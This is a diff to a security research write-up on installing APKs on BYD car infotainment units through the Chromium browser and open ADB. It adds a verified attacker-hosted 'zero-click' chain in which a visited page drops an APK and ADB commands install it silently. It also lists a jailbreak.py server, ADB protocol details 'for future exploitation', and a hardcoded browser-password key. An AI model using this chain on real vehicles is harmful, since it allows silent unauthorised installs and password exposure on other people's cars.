@@ -361,12 +361,24 @@ Via CDP proxy, a web page can:
 
 **Limitation:** CDP-from-browser gives significant control but the install step still requires ADB for `am start`. Chrome's BROWSABLE category check blocks ALL intent:// URLs to PackageInstaller regardless of origin (file:// or web). This is Chromium security, not BYD-specific.
 
-### OverseaAppStore IPC (Unexplored)
+### OverseaAppStore IPC (Investigated — NOT Exploitable for Install)
 
-`com.byd.overseaappstore` is a system app with `INSTALL_PACKAGES` permission and an IPC service:
-- Service: `com.byd.overseaappstoripc.action.RemoteOverseaAppStoreService`
-- Has `FileProvider` registered at `com.byd.overseaappstore.fileProvider`
-- Potential attack vector: if the IPC service can be called from the browser or via CDP to install an APK
+`com.byd.overseaappstore` (V5.0.11) is a system app with `INSTALL_PACKAGES` + `DELETE_PACKAGES` permissions.
+
+**Service:** `RemoteOverseaAppStoreService` — exported=true, NO permission guard
+- AIDL descriptor: `com.byd.overseaappstoreipc.RemoteOverseaAppStoreController`
+- Stub extends `android.os.Binder` (obfuscated as `spi/wl`)
+- **Purpose: Voice-triggered app store navigation** — NOT arbitrary APK install
+- `onTransact` handles `onSendVoiceSoftware`: receives `IpcSoftwareRsp` (id, name, package_name, version, size, source_type) and opens app detail page
+- Activity lifecycle: RESUME, BACK, DESTROY, DEFAULT states for voice-triggered navigation
+
+**FileProvider:** `com.byd.overseaappstore.FileProvider` — exported=false, grantUriPermissions=true
+
+**Custom URI scheme:** `voice_to_overseaappstore://voice` → opens MainActivity (category DEFAULT, NOT BROWSABLE)
+
+**Browser → IPC: NOT VIABLE.** Chrome `intent://` only calls `startActivity()`, never `bindService()`. No BROWSABLE activities. CDP has no service-binding domain.
+
+**Helper app angle:** Any sideloaded app CAN bind to the exported service (no permission guard). But the service only does voice-triggered navigation to app pages in BYD's store — it does NOT expose `installPackage()` or similar. Not useful for arbitrary APK install.
 
 ### Network Services
 
@@ -377,16 +389,28 @@ Via CDP proxy, a web page can:
 | 9222 | localabstract | chrome | CDP | Chrome DevTools Protocol (ADB forward required) |
 | 12406 | 127.0.0.1 | unknown | unknown | Localhost-only, unidentified |
 
-### IWA Direct Sockets Path (Theoretical)
+### IWA Direct Sockets Path (DEAD END)
 
-Potential pure-browser chain using Isolated Web Apps:
-1. Enable IWA flags via CDP → `chrome://flags` → "Enable Isolated Web Apps" = Enabled
-2. `Browser.close` → restart → flags take effect
-3. Install IWA bundle with Direct Sockets API permission
-4. IWA opens raw TCP socket to `localhost:5555` (ADB is on all interfaces)
-5. Speak ADB protocol over TCP → `pm install` APK
+Investigated as potential pure-browser chain:
+1. Enable IWA flags via CDP → `chrome://flags` → "Enable Isolated Web Apps" = Enabled ✓
+2. `Browser.close` → restart → flags take effect ✓
+3. Install IWA bundle with Direct Sockets API permission ✗
+4. IWA opens raw TCP socket to `localhost:5555` (ADB is on all interfaces) ✗
+5. Speak ADB protocol over TCP → `pm install` APK ✗
 
-**Status:** IWA flags can be enabled. IWA bundle installation mechanism on Android Chromium 113 not yet tested. Direct Sockets API availability in IWA context unknown.
+**Why it fails:**
+- IWAs require **Chromium 120+** — our target is 113. Installation infrastructure doesn't exist.
+- Direct Sockets API shipped in **Chrome 128**, IWA-only, **desktop/ChromeOS only** — Android explicitly excluded.
+- No web API in Chromium 113 can emit arbitrary bytes to a raw TCP socket.
+- WebTransport (Chrome 97+, present) requires QUIC — adbd doesn't speak QUIC.
+- WebRTC data channels require DTLS/SCTP — adbd doesn't speak these.
+- WebSocket requires HTTP upgrade handshake — adbd doesn't speak HTTP.
+
+**ADB protocol reference (for future exploitation):**
+- Message header: 24 bytes, little-endian uint32: `[command][arg0][arg1][data_length][checksum][magic]`
+- CNXN handshake: arg0=version, arg1=maxdata, payload=`"host::\0"`
+- If `ro.adb.secure=0` (likely on BYD): AUTH step skipped, immediate CNXN response
+- OPEN: payload=`"shell:pm install /sdcard/Download/app.apk\0"`
 
 ### OPFS (Origin Private File System)
 
@@ -444,7 +468,18 @@ Three viable flows, each tested and confirmed:
 1. `adb connect 192.168.10.10:5555` (port open on all DiLink 3.0 units)
 2. `adb install app.apk` — silent install, no user interaction
 
-**Flow B — Browser + ADB hybrid (automated, one-time setup):**
+**Flow B — PS4-style Browser Jailbreak (VERIFIED, zero-click after page visit):**
+1. Attacker serves exploit page on same WiFi network (laptop/Raspberry Pi)
+2. User navigates car browser to `http://attacker-ip:8080` (or auto-redirected)
+3. Page auto-runs: `fetch()` → blob → `<a download>` drops APK to `/sdcard/Download/`
+4. Server: `adb shell cp /sdcard/Download/app.apk /data/local/tmp/ && pm install -r /data/local/tmp/app.apk`
+5. **APK installed silently. Zero user interaction after visiting URL.**
+6. Use `jailbreak.py --apk path/to/aurora.apk` to install any APK
+
+Chain: `Visit URL` → `blob download` → `ADB cp+pm install` → **INSTALLED**
+Confirmed: `com.test.sideloadtest` installed via `http://localhost:8080/jailbreak.html?auto=1`
+
+**Flow C — Browser + ADB hybrid (manual):**
 1. User visits attacker page → JS blob download drops APK to `/sdcard/Download/`
 2. ADB: `cp /sdcard/Download/app.apk /data/local/tmp/ && pm install /data/local/tmp/app.apk`
 3. Fully silent install. `pm install` from `/sdcard/Download/` fails (SELinux: `system_server` can't read `sdcardfs` context). Must copy to `/data/local/tmp/` first.
@@ -466,8 +501,9 @@ Three viable flows, each tested and confirmed:
 | `am start -a VIEW -t application/vnd.android.package-archive -d file:///sdcard/Download/app.apk` | **Works** | Resolver shows 3 installers (+ EX File Manager if installed) |
 | `pm install /data/local/tmp/app.apk` | **Works** | Silent install, no UI |
 | `pm install /sdcard/Download/app.apk` | Fails | SELinux denies system_server read on sdcardfs |
+| `am start -a VIEW -t .../package-archive -d content://media/external/file/{id}` | **Works** | MediaStore tracks blob-downloaded APKs. Content URI triggers PackageInstaller. |
 | `navigator.share({files: [apkFile]})` | Blocked | `NotAllowedError: Permission denied` — even on localhost (secure context). BYD disabled Web Share Level 2 file sharing. `canShare()` returns true but `share()` throws. |
-| `chrome://downloads` | Blocked | `ERR_BYD_NETWORK_BLOCK_LIST` — BYD blocks ALL chrome:// URLs |
+| `chrome://downloads` | Blocked | `ERR_BYD_NETWORK_BLOCK_LIST` — BYD blocks SOME chrome:// URLs |
 | `intent://` → PackageInstaller | Fails | No BROWSABLE category |
 | `content://downloads/all_downloads` | Fails | `ERR_FILE_NOT_FOUND` |
 | `file:///sdcard/Download/app.apk` navigation | Triggers re-download | Browser treats file:// APK as download, not install trigger |
@@ -504,7 +540,8 @@ For stock units, USB `Third Party Apps` folder is the official method. The blob 
 
 - `blob:` URLs can be navigated to (URL bar shows blob URL) but don't trigger package installer
 - `<a download>` with blob URLs silently blocked (goes through `DownloadController`)
-- `chrome://flags` accessible via CDP navigation — IWA Developer Mode flag found
+- BYD's chrome:// blocklist is INCOMPLETE. Accessible via CDP: `chrome://flags`, `chrome://version`, `chrome://about`, `chrome://net-internals`, `chrome://blob-internals`, `chrome://serviceworker-internals`. Blocked: `chrome://downloads`, `chrome://system`, `chrome://inspect`
+- MediaStore tracks blob-downloaded APK files — `content://media/external/file/{id}` is valid for triggering install via `am start`
 - Browser password encryption: AES/ECB with hardcoded key `"com.byd.browser."` — trivially decryptable
 - `BYDCrossFeatureIds` is NOT a JS bridge — decompiler artifact (integer constants reused as bitflags)
 - `com.google.android.gms` installed but unused for WebAPK minting
@@ -516,6 +553,8 @@ The `tools/browser-exploit/` directory contains test tools from this research:
 - `index.html` — test page with 10 bypass vectors + autofire mode (`?autofire=1` triggers blob download on page load)
 - `install.html` — one-tap install page: blob-downloads APK with unique filename, attempts navigator.share() then falls back to blob download
 - `autodownload.html` — auto-fire blob download test (no user gesture required)
+- `jailbreak.py` — **COMPLETE PS4-STYLE JAILBREAK SERVER.** Self-contained: auto-discovers car on WiFi, serves exploit page, handles ADB install. Usage: `python3 jailbreak.py --apk aurora.apk`. Supports `--car-ip`, `--port`, `--filename`. Silent install via `pm install` or interactive via `am start`.
+- `jailbreak.html` — Jailbreak exploit page. Blob-downloads APK, verifies on filesystem, triggers install via server. Auto-run with `?auto=1` for zero-click. Two modes: silent (pm install) and interactive (PackageInstaller dialog).
 - `exploit.html` — end-to-end exploit chain: blob-download APK → verify file → trigger install via server. Auto-run with `?auto=1`
 - `cdp-exploit.html` — CDP-from-browser capability test: connects to CDP via WS proxy, enumerates targets, tests capabilities, chrome://flags, install triggers
 - `chain-test.html` — comprehensive browser install chain test with vectors A-G
